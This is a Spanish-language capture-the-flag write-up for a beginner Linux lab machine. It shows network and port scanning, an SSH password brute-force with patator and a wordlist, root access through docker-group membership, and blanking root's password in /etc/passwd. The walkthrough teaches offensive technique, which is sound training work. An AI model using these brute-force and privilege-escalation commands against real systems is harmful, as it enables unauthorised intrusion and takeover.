---
layout: post
title: CanYouHackMe?
date: 2024.09.09
categories: [thl, ctf, linux, principiante]
---

![image](/assets/images/canyou/canyou.jpg)

En esta ocasión voy a resolver una máquina **Linux** creada por **Enaitz** de dificultad **Principiante** para la plataforma de [The Hackers Labs](https://thehackerslabs.com/).

# Enumeración

### Escaneo de red local

```bash
$ sudo arp-scan -I enp0s3 --localnet
10.0.2.169      08:00:27:24:af:8e       PCS Systemtechnik GmbH
```

- **`arp-scan`**: Herramienta que escanea la red local usando el protocolo ARP (Address Resolution Protocol).
- **`-I enp0s3`**: Especifica la interfaz de red a utilizar (en este caso `enp0s3`).
- **`-localnet`**: Indica que se escaneará toda la red local.

Obtenemos la dirección IP `10.0.2.169` y la dirección MAC de la máquina victima.

### Escaneo de puertos con Nmap

```bash
$ sudo nmap -sS -p- -Pn -n -v -T 4 10.0.2.169
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- **`nmap`**: Herramienta de escaneo de redes que detecta hosts, servicios y puertos abiertos.
- **`-sS`**: Realiza un escaneo "SYN" o escaneo furtivo. Detecta puertos abiertos sin establecer una conexión completa, lo que lo hace más rápido y menos detectado.
- **`-p-`**: Escanea todos los puertos TCP (del 1 al 65535).
- **`-Pn`**: Omite el escaneo de ping, asume que el host está activo.
- `-n`: Evita la resolución de DNS para acelerar el escaneo.
- `-v`: Modo detallado (verbose), muestra más información durante el escaneo.
- **`-T 4`**: Ajusta la velocidad del escaneo, en este caso a una velocidad agresiva (T4).

Se descubren dos puertos abiertos: 22 (SSH) y 80 (HTTP).

### Escaneo detallado de versiones de servicios

```bash
$ sudo nmap -sCV -p22,80 -v 10.0.2.169
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8da3d7dc8cdc769ceed13fadeb99650 (ECDSA)
|_  256 0324b9cc0bc21509db739bb524d541ca (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://canyouhackme.thl
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

- **`-sCV`**: Realiza un escaneo de servicios (`sV`) para obtener la versión del software, y ejecuta scripts de detección estándar (`sC`).
- **`-p22,80`**: Escanea únicamente los puertos 22 (SSH) y 80 (HTTP).

Se identifican las versiones de los servicios:

- **OpenSSH 9.6p1** (SSH).
- **Apache 2.4.58** (HTTP), con un redireccionamiento a `http://canyouhackme.thl`.

### Modificación del archivo `/etc/hosts`

```bash
$ echo '10.0.2.169  canyouhackme.thl' | sudo tee -a /etc/hosts
10.0.2.169 canyouhackme.thl
```

- **/etc/hosts**: Archivo que mapea direcciones IP a nombres de dominio locales.
- **`echo`**: Imprime la cadena '10.0.2.169 canyouhackme.thl'.
- **`sudo tee -a /etc/hosts`**: Añade (`-a`) la salida del comando `echo` al archivo `/etc/hosts`. Esto mapea el dominio `canyouhackme.thl` a la IP `10.0.2.169`, permitiendo acceder al sitio web localmente usando el nombre de dominio.

### Interacción con el servidor web

```bash
$ curl http://canyouhackme.thl
/* Hola juan, te he dejado un correo importate, cundo puedas, leelo */
```

- **`curl`**: Herramienta que realiza peticiones HTTP desde la línea de comandos.
- **`http://canyouhackme.thl`**: Hace una petición HTTP al servidor web en `10.0.2.169` utilizando el nombre de dominio configurado en el archivo `/etc/hosts`.

Obtenemos en el código fuente un comentario que menciona a un usuario llamado "juan" y que tiene un correo importante.

# Intrusión

### Ataque de fuerza bruta con `patator`

```bash
$ patator ssh_login host=10.0.2.169 user=juan password=FILE0 0=~/rockyou.txt -x ignore:mesg='Authentication failed.' -x ignore:size=53
22:26:03 patator    INFO - 0     40     0.105 | matrix                             |   610 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
```

- **`patator`**: Herramienta para realizar ataques de fuerza bruta sobre diferentes protocolos. En este caso, se usa para probar múltiples contraseñas contra el servicio SSH.
- **`ssh_login`**: Módulo de `patator` para atacar el servicio SSH.
- **`host=10.0.2.169`**: Especifica el host objetivo.
- **`user=juan`**: Define el nombre de usuario (`juan`) para intentar iniciar sesión.
- **`password=FILE0`**: Indica que las contraseñas se tomarán de un archivo. El archivo se define con `0=~/rockyou.txt`, que es un diccionario común de contraseñas.
- **`x ignore:mesg='Authentication failed.'`**: Ignora los intentos fallidos que devuelven este mensaje.
- **`x ignore:size=53`**: Ignora respuestas de cierto tamaño que coincidan con intentos fallidos.

Obtenemos la contraseña del usuario `juan`.

### Acceso SSH al servidor

```bash
$ ssh juan@10.0.2.169
juan@10.0.2.169's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-41-generic x86_64)
Last login: Sat Sep  7 19:26:39 2024 from 192.168.1.142
User flag: 440**********
juan@TheHackersLabs-CanYouHackMe:~$
```

- **`ssh`**: Comando para iniciar una sesión SSH (Secure Shell) en un servidor remoto.
- **`juan@10.0.2.169`**: Especifica el usuario (`juan`) y el servidor (`10.0.2.169`) al que te estás conectando.

Se inicia sesión en la máquina como el usuario `juan` y se recibe el "User flag", un código que confirma que se ha logrado acceso como usuario no privilegiado.

### Verificación de permisos del usuario

```bash
juan@TheHackersLabs-CanYouHackMe:~$ id
uid=1001(juan) gid=1001(juan) groups=1001(juan),100(users),1002(docker)
```

- **`id`**: Muestra la identidad y los grupos a los que pertenece el usuario actual.

Se confirma que el usuario `juan` pertenece al grupo `docker`, lo que sugiere una posible vía de escalada de privilegios.

# Escalada de privilegios

### Escalada de privilegios utilizando Docker

```bash
juan@TheHackersLabs-CanYouHackMe:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
Root flag: 233f3**************
root@6f066383d815:/#
```

- **`docker run`**: Ejecuta un contenedor Docker.
- **`-v /:/mnt`**: Monta el sistema de archivos raíz (`/`) del host en el contenedor bajo el directorio `/mnt`. Esto da acceso completo al sistema de archivos del host.
- **`—rm`**: Elimina el contenedor cuando termine de ejecutarse.
- **`-it`**: Abre una sesión interactiva (terminal) en el contenedor.
- **`alpine`**: Imagen ligera de Linux (Alpine Linux) que se usará para ejecutar el contenedor.
- **`chroot /mnt bash`**: Cambia el directorio raíz del contenedor a `/mnt` (el sistema de archivos del host), y abre una shell Bash con acceso completo al sistema de archivos del host.

Se obtiene acceso como root en el sistema del host desde dentro del contenedor Docker, permitiendo visualizar el "Root flag".

### Modificación del archivo `/etc/passwd`

Ahora solo nos queda obtener acceso al host. Nos movemos al directorio `/mnt`.

```bash
vi ./etc/passwd
```

- **`vi`**: Editor de texto en terminal que se usa para editar archivos.
- **`/etc/passwd`**: Archivo que almacena información sobre los usuarios del sistema. Cada línea representa un usuario.

La línea para el usuario `root` normalmente tiene un campo de contraseña, pero se puede eliminar para permitir el acceso sin contraseña.

```bash
root:x:0:0:root:/root:/bin/bash
```

Esta es la línea original para el usuario `root`. El campo `x` indica que la contraseña está almacenada de forma encriptada en el archivo `/etc/shadow`.

```bash
root::0:0:root:/root:/bin/bash
```

Se elimina el `x`, lo que indica que ahora el usuario `root` no tiene contraseña. Esto permitirá hacer `su` para cambiar al usuario `root` sin necesidad de una contraseña.

### Acceso como usuario root

```bash
/mnt # exit
juan@TheHackersLabs-CanYouHackMe:~$ su
root@TheHackersLabs-CanYouHackMe:~# id
uid=0(root) gid=0(root) groups=0(root)
root@TheHackersLabs-CanYouHackMe:~#
```

- **`su`**: Comando para cambiar al usuario root. Dado que se eliminó la contraseña de root en el paso anterior, ahora se puede acceder como root sin necesidad de ingresar una contraseña.

# **Conclusión**

Este CTF pone en práctica múltiples técnicas de hacking:

- **Reconocimiento**: Escaneo de red y de puertos para identificar servicios vulnerables.
- **Explotación**: Ataque de fuerza bruta para obtener credenciales de usuario.
- **Escalada de privilegios**: Uso del grupo `docker` para obtener acceso completo a la máquina mediante contenedores Docker.